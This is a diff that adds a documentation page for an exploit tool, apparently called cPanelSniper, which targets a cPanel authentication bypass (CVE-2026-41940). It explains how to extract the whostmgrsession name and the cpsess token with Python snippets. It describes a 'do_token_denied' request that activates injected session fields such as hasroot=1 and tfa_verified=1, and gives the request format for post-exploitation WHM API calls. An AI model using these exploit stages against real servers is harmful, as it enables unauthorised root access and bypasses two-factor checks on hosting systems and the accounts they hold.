@@ -1,0 +1,77 @@
+---
+title: "cPanel Session File Mechanics and Token Extraction"
+description: "How cPanel's whostmgrsession cookie works, session name extraction from Set-Cookie, and token propagation via the do_token_denied gadget."
+---
+
+Understanding how cPanel manages sessions on disk is key to understanding why CVE-2026-41940 works. cPanel stores session state as flat key-value files on disk and reads them back when authenticating requests. This page documents the session cookie format, token extraction, and the propagation step required to activate injected session fields.
+
+## The whostmgrsession cookie
+
+When you POST to `/login/?login_only=1`, cPanel returns a `Set-Cookie` header even on a 401 response:
+
+```
+Set-Cookie: whostmgrsession=%3aSESSION_NAME%2cOB_HEX; path=/; HttpOnly; Secure
+```
+
+The value URL-decodes to:
+
+```
+:SESSION_NAME,OB_HEX
+```
+
+- The part before the comma (`,` / `%2C`) is the **session name** — the filename used to look up the session on disk.
+- The part after the comma is the **ob hash** — an integrity token that is discarded in the exploit.
+
+cPanelSniper extracts the session name by URL-decoding the cookie value and splitting on `,`:
+
+```python
+decoded = unquote(raw_ck)
+if "," in decoded:
+    session_base = decoded.split(",", 1)[0]
+```
+
+This `session_base` is then re-encoded and sent as the `Cookie` header in all subsequent exploit stages.
+
+## The /cpsessXXXXXXXXXX token
+
+After the CRLF injection request (Stage 2), cPanel responds with a `307 Location` redirect:
+
+```
+Location: /cpsess8493537756/frontend/...
+```
+
+cPanelSniper extracts the `/cpsessXXXXXXXXXX` token using:
+
+```python
+m = re.search(r"/cpsess(\d{10})", loc)
+token = f"/cpsess{m.group(1)}"
+```
+
+This token is a session path prefix required in all WHM API calls after authentication.
+
+## Stage 3: the do_token_denied gadget
+
+After the CRLF injection, the poisoned fields exist only in the **raw session file** on disk. They are not yet active in the session cache. A direct WHM API call at this point would return a 403.
+
+The `do_token_denied` gadget is triggered by requesting a page that requires an authenticated token before the session is cached:
+
+```
+GET /scripts2/listaccts
+Cookie: whostmgrsession=<session_base>
+```
+
+This request triggers cPanel's internal `do_token_denied` handler, which flushes the raw session file into the session cache — making the injected fields (`hasroot=1`, `tfa_verified=1`, etc.) active. The expected response is a `401` with `Token denied` in the body.
+
+Without this step, Stage 4 verification would fail with a 403.
+
+## WHM API request format
+
+All post-exploitation API calls use the authenticated session:
+
+```
+GET /{token}/json-api/{function}?api.version=1&{params}
+Host: {canonical_hostname}:{port}
+Cookie: whostmgrsession={session_base}
+```
+
+The `token` is the `/cpsessXXXXXXXXXX` value extracted in Stage 2. See [WHM API Endpoints](/reference/whm-api) for the full list of endpoints used.
